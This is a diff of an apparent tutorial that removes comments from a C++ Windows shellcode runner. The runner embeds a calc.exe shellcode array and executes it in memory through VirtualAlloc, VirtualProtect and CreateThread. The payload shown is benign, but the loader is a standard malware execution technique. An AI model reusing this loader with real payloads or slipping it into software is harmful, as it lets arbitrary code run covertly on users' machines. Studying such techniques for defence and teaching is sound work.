@@ -23,15 +23,11 @@ We'll use a shellcode payload that spawns the calculator (`calc.exe`). This is c
 ## Full C++ Code
 
 ```cpp
-/*
-  C++ implementation of a shellcode execution example with calc.exe payload
-*/
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
-// our payload calc.exe
 unsigned char my_payload[] = {
   0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
   0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
@@ -65,17 +61,13 @@ int main(void) {
   HANDLE th;
   DWORD oldprotect = 0;
 
-  // Allocate a memory buffer for payload
   my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-  // copy payload to buffer
   RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);
 
-  // make new buffer as executable
   rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
   if ( rv != 0 ) {
 
-    // run payload
     th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) my_payload_mem, 0, 0, 0);
     WaitForSingleObject(th, -1);
   }
